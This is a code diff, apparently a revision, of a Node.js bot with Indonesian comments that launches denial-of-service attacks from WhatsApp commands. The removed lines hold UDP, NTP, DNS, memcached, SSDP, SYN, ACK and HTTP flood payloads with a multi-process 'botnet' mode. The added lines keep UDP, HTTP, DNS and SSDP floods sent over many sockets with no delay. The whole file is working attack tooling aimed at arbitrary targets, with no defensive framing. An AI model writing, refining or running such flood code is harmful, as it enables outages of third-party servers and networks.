@@ -4,23 +4,19 @@ const fs = require('fs');
 const readline = require('readline');
 const { exec } = require('child_process');
 const { createSocket } = require('dgram');
-const { randomBytes } = require('crypto');
+const crypto = require('crypto'); // Tambahkan import crypto secara eksplisit
 const net = require('net');
 const os = require('os');
-const cluster = require('cluster');
-const numCPUs = os.cpus().length;
 
 // Konfigurasi bot
 const CONFIG = {
     prefix: '!',
-    ownerNumber: '6281280174445', // Ganti dengan nomor WhatsApp Anda
-    authPath: './auth_info',
+    ownerNumber: '6281280174445', // Nomor WhatsApp Anda
+    authPath: './auth_info_baileys',
     logLevel: 'silent',
-    attackDelay: 3, // Tidak ada delay antar paket (maksimum kecepatan)
-    maxThreads: 5000, // Jumlah thread per serangan sangat tinggi
-    maxPacketSize: 655057, // Ukuran maksimal UDP packet
-    multiprocessing: true, // Gunakan multi-process untuk serangan
-    amplificationFactor: 10 // Faktor amplifikasi untuk serangan
+    attackDelay: 0,
+    maxThreads: 1000,
+    maxPacketSize: 65507
 };
 
 // State aplikasi
@@ -29,8 +25,7 @@ const state = {
     sockets: [],
     totalPacketsSent: 0,
     totalBytesSent: 0,
-    startTime: Date.now(),
-    workers: []
+    startTime: Date.now()
 };
 
 // Readline interface
@@ -39,79 +34,19 @@ const rl = readline.createInterface({
     output: process.stdout
 });
 
-// Payload templates untuk berbagai jenis serangan
-const ATTACK_TEMPLATES = {
-    udp: Buffer.from(randomBytes(512)), // Basic UDP flood
-    
-    // NTP amplification payload
-    ntp: Buffer.from([
-        0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-    ]),
-    
-    // DNS amplification query
-    dns: Buffer.from([
-        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
-        0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
-        0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
-    ]),
-    
-    // SYN flood simulation
-    syn: Buffer.from([
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x50, 0x02, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00
-    ]),
-    
-    // MEMCACHED amplification
-    memcached: Buffer.from([
-        0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
-        0x73, 0x74, 0x61, 0x74, 0x73, 0x0d, 0x0a
-    ]),
-    
-    // SSDP amplification
-    ssdp: Buffer.from(
-        'M-SEARCH * HTTP/1.1\r\n' +
-        'HOST: 239.255.255.250:1900\r\n' +
-        'MAN: "ssdp:discover"\r\n' +
-        'MX: 2\r\n' +
-        'ST: ssdp:all\r\n\r\n'
-    ),
-    
-    // ACK flood simulation
-    ack: Buffer.from([
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x50, 0x10, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00
-    ]),
-    
-    // HTTP flood with random GET
-    http: (target) => {
-        const paths = ['/','index.php','login.php','admin.php','search','api/v1','user','profile'];
-        const randomPath = paths[Math.floor(Math.random() * paths.length)];
-        const httpRequest = 
-            `GET ${randomPath} HTTP/1.1\r\n` +
-            `Host: ${target}\r\n` +
-            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n' +
-            'Accept: */*\r\n' +
-            'Connection: Keep-Alive\r\n\r\n';
-        return Buffer.from(httpRequest);
-    }
+// Membuat buffer random
+const randomBytes = (size) => {
+    return crypto.randomBytes(size);
 };
 
 // Fungsi untuk mengecek status target
 const checkTarget = (target, port = 80) => {
     return new Promise((resolve) => {
-        // Cek DNS terlebih dahulu
         const socket = new net.Socket();
-        socket.setTimeout(5000); // 5 detik timeout
+        socket.setTimeout(5000);
         
         let isResolved = false;
+        const connectStart = Date.now();
         
         socket.on('connect', () => {
             if (isResolved) return;
@@ -156,7 +91,6 @@ const checkTarget = (target, port = 80) => {
             }
         });
         
-        const connectStart = Date.now();
         socket.connect(port, target);
     });
 };
@@ -174,17 +108,51 @@ const runCommand = (command) => {
     });
 };
 
-// Membuat payload serangan
+// Jenis-jenis payload serangan
+const ATTACK_PAYLOADS = {
+    // Basic UDP flood
+    udp: () => randomBytes(512),
+    
+    // HTTP flood
+    http: (target) => {
+        const paths = ['/', '/index.php', '/login', '/admin', '/api/v1/users', '/search'];
+        const path = paths[Math.floor(Math.random() * paths.length)];
+        const httpReq = `GET ${path} HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n`;
+        return Buffer.from(httpReq);
+    },
+    
+    // DNS amplification
+    dns: () => {
+        return Buffer.from([
+            0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
+            0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
+            0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
+        ]);
+    },
+    
+    // SSDP amplification
+    ssdp: () => {
+        return Buffer.from(
+            'M-SEARCH * HTTP/1.1\r\n' +
+            'HOST: 239.255.255.250:1900\r\n' +
+            'MAN: "ssdp:discover"\r\n' +
+            'MX: 2\r\n' +
+            'ST: ssdp:all\r\n\r\n'
+        );
+    }
+};
+
+// Fungsi untuk membuat payload serangan
 const createPayload = (type, target, size) => {
-    // Dapatkan template
     let basePayload;
+    
     if (type === 'http') {
-        basePayload = ATTACK_TEMPLATES.http(target);
-    } else if (ATTACK_TEMPLATES[type]) {
-        basePayload = ATTACK_TEMPLATES[type];
+        basePayload = ATTACK_PAYLOADS.http(target);
+    } else if (ATTACK_PAYLOADS[type]) {
+        basePayload = ATTACK_PAYLOADS[type]();
     } else {
-        // Default ke UDP flood jika tipe tidak dikenali
-        basePayload = ATTACK_TEMPLATES.udp;
+        basePayload = ATTACK_PAYLOADS.udp();
         type = 'udp';
     }
     
@@ -202,71 +170,8 @@ const createPayload = (type, target, size) => {
     return payload;
 };
 
-// Fungsi attack yang dijalankan oleh worker
-const attackWorker = (target, port, duration, payload, attackId, intensity = 1) => {
-    const sockets = [];
-    const stats = { packetsSent: 0, bytesSent: 0 };
-    const socketCount = 50 * intensity; // Membuat lebih banyak socket berdasarkan intensitas
-    
-    // Buat multiple socket untuk serangan
-    for (let i = 0; i < socketCount; i++) {
-        try {
-            const socket = createSocket('udp4');
-            socket.unref(); // Biarkan program keluar meskipun socket masih terbuka
-            socket.on('error', () => {}); // Ignore errors
-            sockets.push(socket);
-        } catch (err) {
-            // Ignore socket creation errors
-        }
-    }
-    
-    // Kirim paket secepat mungkin
-    const sendPackets = () => {
-        for (const socket of sockets) {
-            for (let i = 0; i < 50; i++) { // Kirim 50 paket per socket per iterasi
-                try {
-                    socket.send(payload, 0, payload.length, port, target);
-                    stats.packetsSent++;
-                    stats.bytesSent += payload.length;
-                } catch (err) {
-                    // Ignore send errors
-                }
-            }
-        }
-        
-        // Schedule next burst immediately
-        if (Date.now() < endTime) {
-            setImmediate(sendPackets);
-        } else {
-            // Cleanup sockets when done
-            for (const socket of sockets) {
-                try {
-                    socket.close();
-                } catch (err) {}
-            }
-            
-            // Send final stats to parent
-            if (process.send) {
-                process.send({
-                    type: 'attackComplete',
-                    attackId,
-                    stats
-                });
-            }
-            
-            process.exit(0);
-        }
-    };
-    
-    // Set end time
-    const endTime = Date.now() + (duration * 1000);
-    
-    // Start sending
-    sendPackets();
-};
-
-// Memulai serangan dengan multi-process
-const startAttack = (target, port, duration, size = 1024, threads = 100, type = 'udp', amplify = 1) => {
+// Memulai serangan UDP
+const startAttack = (target, port, duration, size = 1024, threads = 100, type = 'udp') => {
     console.log(`[Attack] Memulai serangan ke ${target}:${port} (${duration}s, ${threads} threads, ${size}b, ${type})`);
     
     const attackId = `${target}:${port}`;
@@ -283,107 +188,63 @@ const startAttack = (target, port, duration, size = 1024, threads = 100, type = 
     // Generate payload
     const payload = createPayload(type, target, actualSize);
     
-    // Statistik serangan
-    const attackStats = {
-        target,
-        port,
-        type,
-        size: actualSize,
-        threads: actualThreads,
-        duration,
-        startTime: Date.now(),
-        packetsSent: 0,
-        bytesSent: 0,
-        workers: []
-    };
-    
-    // Jika multi-processing diaktifkan, gunakan workers
-    if (CONFIG.multiprocessing) {
-        // Hitung jumlah worker berdasarkan thread
-        const workerCount = Math.min(numCPUs, Math.ceil(actualThreads / 50));
-        
-        for (let i = 0; i < workerCount; i++) {
-            const worker = cluster.fork();
-            
-            // Kirim parameter serangan ke worker
-            worker.send({
-                type: 'startAttack',
-                target,
-                port,
-                duration,
-                attackId,
-                size: actualSize,
-                intensity: Math.ceil(actualThreads / workerCount) / 50
-            });
-            
-            // Tambahkan worker ke daftar
-            attackStats.workers.push(worker.id);
-            state.workers.push(worker);
-            
-            // Handle pesan dari worker
-            worker.on('message', (msg) => {
-                if (msg.type === 'attackComplete') {
-                    // Update statistik dari worker
-                    state.attacks[msg.attackId].packetsSent += msg.stats.packetsSent;
-                    state.attacks[msg.attackId].bytesSent += msg.stats.bytesSent;
-                    state.totalPacketsSent += msg.stats.packetsSent;
-                    state.totalBytesSent += msg.stats.bytesSent;
-                }
-            });
-            
-            // Handle worker exit
-            worker.on('exit', () => {
-                const index = state.workers.indexOf(worker);
-                if (index !== -1) {
-                    state.workers.splice(index, 1);
-                }
-            });
+    // Buat socket
+    const sockets = [];
+    for (let i = 0; i < actualThreads; i++) {
+        try {
+            const socket = createSocket('udp4');
+            socket.on('error', () => {});
+            socket.unref();
+            sockets.push(socket);
+            state.sockets.push(socket);
+        } catch (err) {
+            console.error(`Error socket: ${err.message}`);
         }
-    } else {
-        // Gunakan pendekatan single-process dengan setInterval
-        const sockets = [];
-        
-        // Buat socket
-        for (let i = 0; i < actualThreads; i++) {
-            try {
-                const socket = createSocket('udp4');
-                socket.on('error', () => {});
-                sockets.push(socket);
-                state.sockets.push(socket);
-            } catch (err) {
-                console.error(`Error socket: ${err.message}`);
-            }
-        }
-        
-        // Buat interval untuk mengirim
-        const intervalId = setInterval(() => {
-            for (const socket of sockets) {
-                try {
-                    for (let i = 0; i < amplify; i++) { // Kirim beberapa paket per iterasi
-                        socket.send(payload, 0, payload.length, port, target, (err) => {
-                            if (!err) {
-                                attackStats.packetsSent++;
-                                attackStats.bytesSent += payload.length;
-                                state.totalPacketsSent++;
-                                state.totalBytesSent += payload.length;
-                            }
-                        });
-                    }
-                } catch (err) {
-                    // Ignore errors
-                }
-            }
-        }, CONFIG.attackDelay);
-        
-        // Simpan referensi ke interval dan socket
-        attackStats.intervalId = intervalId;
-        attackStats.sockets = sockets;
     }
     
-    // Simpan info serangan
-    state.attacks[attackId] = attackStats;
+    // Statistik attack
+    const stats = {
+        packetsSent: 0,
+        bytesSent: 0,
+        startTime: Date.now()
+    };
     
-    // Set timeout untuk menghentikan serangan
+    // Interval untuk mengirim paket
+    const intervalId = setInterval(() => {
+        for (const socket of sockets) {
+            try {
+                // Kirim beberapa paket sekaligus untuk setiap socket
+                for (let i = 0; i < 10; i++) {
+                    socket.send(payload, 0, payload.length, port, target, (err) => {
+                        if (!err) {
+                            stats.packetsSent++;
+                            stats.bytesSent += payload.length;
+                            state.totalPacketsSent++;
+                            state.totalBytesSent += payload.length;
+                        }
+                    });
+                }
+            } catch (err) {
+                // Ignore errors
+            }
+        }
+    }, CONFIG.attackDelay);
+    
+    // Simpan info attack
+    state.attacks[attackId] = {
+        target,
+        port,
+        intervalId,
+        sockets,
+        type,
+        stats,
+        duration,
+        size: actualSize,
+        threads: actualThreads,
+        startTime: Date.now()
+    };
+    
+    // Set timeout untuk menghentikan attack
     if (duration > 0) {
         setTimeout(() => {
             stopAttack(target, port);
@@ -402,50 +263,48 @@ const stopAttack = (target, port) => {
         return false;
     }
     
-    console.log(`[Attack] Menghentikan serangan ke ${target}:${port}`);
+    clearInterval(attack.intervalId);
     
-    // Hentikan serangan berdasarkan mode
-    if (CONFIG.multiprocessing) {
-        // Mode multi-process: kirim pesan stop ke workers
-        state.workers.forEach(worker => {
-            try {
-                worker.kill('SIGTERM');
-            } catch (err) {
-                // Ignore errors
+    for (const socket of attack.sockets) {
+        try {
+            socket.close();
+            const index = state.sockets.indexOf(socket);
+            if (index !== -1) {
+                state.sockets.splice(index, 1);
             }
-        });
-        
-        // Reset workers array
-        state.workers = [];
-    } else {
-        // Mode single-process: hentikan interval dan tutup socket
-        clearInterval(attack.intervalId);
-        
-        // Tutup socket
-        for (const socket of attack.sockets) {
-            try {
-                socket.close();
-                const index = state.sockets.indexOf(socket);
-                if (index !== -1) {
-                    state.sockets.splice(index, 1);
-                }
-            } catch (err) {
-                // Ignore errors
-            }
+        } catch (err) {
+            // Ignore errors
         }
     }
     
-    // Hitung uptime serangan
-    const elapsed = (Date.now() - attack.startTime) / 1000;
-    console.log(`[Stats] Serangan selesai: ${attack.packetsSent.toLocaleString()} paket (${Math.round(attack.bytesSent / (1024 * 1024))} MB) dalam ${elapsed.toFixed(2)}s`);
+    console.log(`[Attack] Menghentikan serangan ke ${target}:${port}`);
     
-    // Hapus dari daftar serangan aktif
+    // Statistik akhir
+    const elapsed = (Date.now() - attack.stats.startTime) / 1000;
+    console.log(`[Stats] Serangan selesai: ${attack.stats.packetsSent} paket (${Math.round(attack.stats.bytesSent / (1024 * 1024))} MB) dalam ${elapsed.toFixed(2)}s`);
+    
     delete state.attacks[attackId];
     
     return true;
 };
 
-// Meminta pairing code untuk WhatsApp
+// Fungsi untuk menggunakan QR code login sebagai fallback
+const connectWithQR = async (sock) => {
+    console.log("\nMenggunakan mode QR code sebagai fallback...");
+    console.log("Silakan scan QR code berikut di WhatsApp Anda:");
+    
+    // Tunggu QR code atau koneksi terbuka
+    return new Promise((resolve) => {
+        const checkInterval = setInterval(() => {
+            if (sock.user) {
+                clearInterval(checkInterval);
+                resolve(true);
+            }
+        }, 1000);
+    });
+};
+
+// Fungsi untuk meminta kode pairing
 const requestPairingCode = async (sock) => {
     try {
         // Tanya nomor WhatsApp
@@ -463,25 +322,26 @@ const requestPairingCode = async (sock) => {
         
         console.log(`\nMeminta kode pairing untuk nomor ${phoneNumber}...`);
         
-        // Minta kode pairing
-        const code = await sock.requestPairingCode(phoneNumber);
-        
-        console.log('\n==================================');
-        console.log(`KODE PAIRING: ${code}`);
-        console.log('==================================\n');
-        console.log('Masukkan kode ini di WhatsApp untuk menautkan perangkat');
-        
+        try {
+            // Minta kode pairing
+            const code = await sock.requestPairingCode(phoneNumber);
+            
+            console.log('\n==================================');
+            console.log(`KODE PAIRING: ${code}`);
+            console.log('==================================\n');
+            console.log('Masukkan kode ini di WhatsApp untuk menautkan perangkat');
+        } catch (error) {
+            console.error('Error saat meminta kode pairing:', error);
+            console.log('Mencoba metode login dengan QR code...');
+            await connectWithQR(sock);
+        }
     } catch (error) {
-        console.error('Error saat meminta kode pairing:', error);
-        console.log('Coba lagi dalam 5 detik...');
-        
-        // Tunggu 5 detik dan coba lagi
-        await new Promise(resolve => setTimeout(resolve, 5000));
-        await requestPairingCode(sock);
+        console.error('Error dalam requestPairingCode:', error);
+        await connectWithQR(sock);
     }
 };
 
-// Handle perintah WhatsApp
+// Handle perintah dari chat WhatsApp
 const handleCommand = async (sock, msg, command, params) => {
     const sender = msg.key.remoteJid;
     const isSenderOwner = sender.includes(CONFIG.ownerNumber);
@@ -505,13 +365,9 @@ const handleCommand = async (sock, msg, command, params) => {
 
 Tipe serangan:
 - udp: UDP Flood standar (default)
-- http: HTTP Flood dengan GET requests
-- syn: SYN Flood simulation
-- dns: DNS Amplification simulation
-- ntp: NTP Amplification simulation
-- memcached: Memcached Amplification
-- ssdp: SSDP Amplification
-- ack: ACK Flood simulation`
+- http: HTTP Flood
+- dns: DNS Amplification
+- ssdp: SSDP Amplification`
                     }, { quoted: msg });
                     return;
                 }
@@ -543,8 +399,7 @@ Hidup: ${status.isUp ? 'Ya' : 'Tidak'}`
                     parseInt(duration),
                     parseInt(size),
                     parseInt(threads),
-                    type,
-                    CONFIG.amplificationFactor
+                    type
                 );
                 
                 await sock.sendMessage(sender, { 
@@ -554,8 +409,7 @@ Durasi: ${duration} detik
 Ukuran: ${size} bytes
 Threads: ${threads}
 Tipe: ${type}
-ID: ${attackId}
-Mode: ${CONFIG.multiprocessing ? 'Multi-process' : 'Single-process'}`
+ID: ${attackId}`
                 }, { quoted: msg });
                 break;
                 
@@ -606,8 +460,8 @@ Mode: ${CONFIG.multiprocessing ? 'Multi-process' : 'Single-process'}`
                     listMessage += `Durasi: ${attack.duration}s\n`;
                     listMessage += `Waktu berjalan: ${elapsedTime}s\n`;
                     listMessage += `Sisa waktu: ${Math.max(0, remainingTime)}s\n`;
-                    listMessage += `Paket terkirim: ${attack.packetsSent.toLocaleString()}\n`;
-                    listMessage += `Data terkirim: ${Math.round(attack.bytesSent / (1024 * 1024))} MB\n\n`;
+                    listMessage += `Paket terkirim: ${attack.stats.packetsSent.toLocaleString()}\n`;
+                    listMessage += `Data terkirim: ${Math.round(attack.stats.bytesSent / (1024 * 1024))} MB\n\n`;
                 }
                 
                 await sock.sendMessage(sender, { text: listMessage }, { quoted: msg });
@@ -672,11 +526,6 @@ ${targetStatus.latency ? `Latency: ${targetStatus.latency}ms` : ''}`
 - Memory: ${serverInfo.freeMemory} free / ${serverInfo.totalMemory} total
 - System uptime: ${serverInfo.uptime}
 
-⚙️ Config:
-- Multi-processing: ${CONFIG.multiprocessing ? 'Aktif' : 'Tidak aktif'}
-- Max threads: ${CONFIG.maxThreads}
-- Amplification: ${CONFIG.amplificationFactor}x
-
 ⚔️ Attack Status:
 - Serangan aktif: ${Object.keys(state.attacks).length}`;
 
@@ -725,13 +574,9 @@ ${targetStatus.latency ? `Latency: ${targetStatus.latency}ms` : ''}`
 
 Tipe serangan yang tersedia:
 - udp: UDP Flood standar
-- http: HTTP Flood dengan GET requests
-- syn: SYN Flood simulation
-- dns: DNS Amplification simulation
-- ntp: NTP Amplification simulation
-- memcached: Memcached Amplification
-- ssdp: SSDP Amplification
-- ack: ACK Flood simulation`;
+- http: HTTP Flood
+- dns: DNS Amplification
+- ssdp: SSDP Amplification`;
 
                 await sock.sendMessage(sender, { text: helpMessage }, { quoted: msg });
                 break;
@@ -748,13 +593,16 @@ Tipe serangan yang tersedia:
 // Fungsi utama untuk menjalankan bot
 async function startBot() {
     console.log('='.repeat(50));
-    console.log('🚀 UDP BOTNET ATTACK - SUPER EDITION');
+    console.log('🚀 UDP ATTACK BOT - FINAL VERSION');
     console.log('='.repeat(50));
     
     // Buat folder auth jika belum ada
     if (!fs.existsSync(CONFIG.authPath)) {
         fs.mkdirSync(CONFIG.authPath, { recursive: true });
     }
+    
+    // Batasi jumlah listener untuk event emitter
+    process.setMaxListeners(20);
     
     // Inisialisasi auth state
     const { state: authState, saveCreds } = await useMultiFileAuthState(CONFIG.authPath);
@@ -765,55 +613,21 @@ async function startBot() {
     // Buat socket WhatsApp
     const sock = makeWASocket({
         auth: authState,
-        printQRInTerminal: false,
+        printQRInTerminal: true, // Aktifkan QR code sebagai fallback
         logger,
         browser: ['Chrome (Linux)', 'Chrome', '103.0.5060.114'],
         connectTimeoutMs: 60000,
         defaultQueryTimeoutMs: 60000,
-        keepAliveIntervalMs: 10000,
-        emitOwnEvents: false,
-        markOnlineOnConnect: false
+        emitOwnEvents: false
     });
     
     // Handle koneksi
     sock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect } = update;
+        const { connection, lastDisconnect, qr } = update;
         
         if (connection === 'open') {
             console.log('\n✅ Bot terhubung ke WhatsApp!');
             console.log(`📱 Nomor: ${sock.user.id.split(':')[0]}`);
-            
-            // Setup multi-processing dengan cluster jika diaktifkan
-            if (CONFIG.multiprocessing && cluster.isPrimary) {
-                console.log(`\n🔄 Setting up ${numCPUs} worker processes for attacks`);
-                
-                // Listen for worker messages
-                cluster.on('message', (worker, message) => {
-                    if (message.type === 'attackStats') {
-                        // Update attack stats
-                        if (state.attacks[message.attackId]) {
-                            state.attacks[message.attackId].packetsSent += message.packetsSent;
-                            state.attacks[message.attackId].bytesSent += message.bytesSent;
-                            state.totalPacketsSent += message.packetsSent;
-                            state.totalBytesSent += message.bytesSent;
-                        }
-                    }
-                });
-            } else if (cluster.isWorker) {
-                // Worker process logic
-                process.on('message', (message) => {
-                    if (message.type === 'startAttack') {
-                        attackWorker(
-                            message.target,
-                            message.port,
-                            message.duration,
-                            createPayload(message.type || 'udp', message.target, message.size || 1024),
-                            message.attackId,
-                            message.intensity || 1
-                        );
-                    }
-                });
-            }
         }
         
         if (connection === 'close') {
@@ -824,7 +638,10 @@ async function startBot() {
                 console.log('🔄 Mencoba menghubungkan ulang...');
                 
                 // Cleanup resources
-                stopAllAttacks();
+                for (const attackId in state.attacks) {
+                    const [t, p] = attackId.split(':');
+                    stopAttack(t, parseInt(p));
+                }
                 
                 // Wait 3 seconds and try again
                 setTimeout(() => {
@@ -836,13 +653,13 @@ async function startBot() {
             }
         }
         
-        // Request pairing code when connecting
-        if (connection === 'connecting') {
+        // Request pairing code when connecting and QR not scanned
+        if (connection === 'connecting' && !qr) {
             setTimeout(async () => {
                 if (!sock.user) {
                     await requestPairingCode(sock);
                 }
-            }, 3000);
+            }, 5000);
         }
     });
     
@@ -884,40 +701,22 @@ async function startBot() {
     // Handle credentials update
     sock.ev.on('creds.update', saveCreds);
     
-    // Fungsi untuk menghentikan semua serangan
-    const stopAllAttacks = () => {
-        // Stop all active attacks
+    // Handle process exit
+    process.on('SIGINT', async () => {
+        console.log('\n🛑 Menghentikan bot...');
+        
+        // Hentikan semua serangan
         for (const attackId in state.attacks) {
             const [target, port] = attackId.split(':');
             stopAttack(target, parseInt(port));
         }
         
-        // Kill all worker processes
-        for (const worker of state.workers) {
-            try {
-                worker.kill('SIGTERM');
-            } catch (err) {
-                // Ignore errors
-            }
-        }
-        state.workers = [];
-        
-        // Close all sockets
+        // Bersihkan socket
         for (const socket of state.sockets) {
             try {
                 socket.close();
-            } catch (err) {
-                // Ignore errors
-            }
+            } catch (err) {}
         }
-        state.sockets = [];
-    };
-    
-    // Handle process exit
-    process.on('SIGINT', async () => {
-        console.log('\n🛑 Menghentikan bot...');
-        
-        stopAllAttacks();
         
         console.log('👋 Bot dihentikan.');
         process.exit(0);
@@ -926,39 +725,12 @@ async function startBot() {
     return sock;
 }
 
-// Mode operasi berdasarkan cluster
-if (cluster.isPrimary) {
-    // Primary process starts the bot
-    console.log(`🔄 Starting primary process (PID: ${process.pid})`);
-    
-    // Mulai bot
-    startBot().catch(err => {
-        console.error('❌ Error saat menjalankan bot:', err);
-        console.log('🔄 Mencoba ulang dalam 5 detik...');
-        setTimeout(() => {
-            startBot();
-        }, 5000);
-    });
-} else {
-    // Worker process just waits for messages
-    console.log(`🔄 Worker process started (PID: ${process.pid})`);
-    
-    // Keep track of stats
-    const workerStats = {
-        packetsSent: 0,
-        bytesSent: 0
-    };
-    
-    // Send stats to primary process periodically
-    setInterval(() => {
-        if (process.send && workerStats.packetsSent > 0) {
-            process.send({
-                type: 'attackStats',
-                packetsSent: workerStats.packetsSent,
-                bytesSent: workerStats.bytesSent
-            });
-            workerStats.packetsSent = 0;
-            workerStats.bytesSent = 0;
-        }
-    }, 1000);
-}
+// Mulai bot
+console.log('Memulai UDP Attack Bot...');
+startBot().catch(err => {
+    console.error('❌ Error saat menjalankan bot:', err);
+    console.log('🔄 Mencoba ulang dalam 5 detik...');
+    setTimeout(() => {
+        startBot();
+    }, 5000);
+});
